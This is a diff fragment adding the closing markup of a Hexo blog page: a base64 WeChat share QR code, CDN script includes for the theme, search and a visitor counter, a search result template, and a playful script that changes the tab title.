+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKUlEQVR42u3aQW7DMAwEwP7/0ynQa2pnl3ILWB6dgtiVNDmwosivr3i8fsbR9+/j/a+Onp5/c/HAwMC4LeN1Oo7eSeY5+iHOZ06e/rIHDAyMBzDOg2zCqBeOkdE/AAwMDIw4XOaHvPywiIGBgdEyZsltG6AxMDAwZklsAsifzpLnC3JxDAyMGzLawsB/fv7D+gYGBsZNGK9yJIlrvtZ5KC92hYGBsTVjtq2rrtvOr97qNzEwMDZlrF/9t8iVJozDtTAwMB7DWAmsSQEyD8r5xR8GBsYTGHnrQ5vQ5gWDWUngcC0MDIztGEnIa6/PZry8ySMKshgYGBsx2sDXVhKTI2NbKF26O8TAwLg5I296aN9Zv8Jrfw4MDIz9GG27w0rYbVPcYj8YGBibMqIC4SitbTfaFjV/qW9gYGA8mDG7jFspgubXedGGMDAwbs5oD3NtGWAlTc2pGBgYT2C0qWzSnLFSEG3LpRgYGM9hzBLI5Og2+zlm62JgYOzKyI9is2XyJLk4AiYZOQYGxhaM9aaHPFxeG2oxMDAwZiF1loi2rR4fmi0wMDC2Y+RjZaP5zFe9iYGBsRNjFtry8JfPthKaMTAw9ma0AXcWgtsr/hkSAwNjb0YbZK9tPG15H6qvGBgYWzPyxot2hhl4mMpiYGA8nnFtQ8YsNf1wNMTAwMAoL+Dy2fIiAQYGxpMZ7UbXCwB5MSDaCQYGxtaMWWGgPQLmRce2pIqBgbE14xt9KHrAVvD03gAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
